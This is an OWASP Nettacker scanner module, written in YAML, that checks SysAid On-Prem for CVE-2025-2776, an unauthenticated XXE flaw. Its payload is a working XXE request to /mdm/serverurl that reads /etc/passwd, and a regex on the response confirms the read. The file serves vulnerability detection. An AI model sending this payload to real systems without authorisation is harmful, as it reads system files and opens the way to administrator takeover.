info:
  name: sysaid_xxe_cve_2025_2776_vuln
  author: OWASP Nettacker Team
  severity: 9.3
  description: |
    SysAid On-Prem versions <= 23.3.40 are vulnerable to an unauthenticated
    XML External Entity (XXE) vulnerability in the /mdm/serverurl endpoint,
    allowing arbitrary file read and potential administrator account takeover.
  reference:
    - https://labs.watchtowr.com/sysowned-your-friendly-rce-support-ticket/
    - https://nvd.nist.gov/vuln/detail/CVE-2025-2776
    - https://documentation.sysaid.com/docs/24-40-60
  profiles:
    - vuln
    - http
    - critical_severity
    - cve
    - cve2025
    - xxe
    - sysaid

payloads:
  - library: http
    steps:
      - method: post
        timeout: 5
        headers:
          Content-Type: "application/xml"
        data: |
          <?xml version="1.0"?>
          <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
          ]>
          <root>&xxe;</root>
        allow_redirects: false
        ssl: false
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}{{paths}}"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              schema:
                - "http"
                - "https"
              ports:
                - 80
                - 443
              paths:
                - "/mdm/serverurl"
        response:
          condition_type: and
          conditions:
            status:
              regex: "200"
              reverse: false
            content:
              regex: "root:.*:0:0:"
              reverse: false


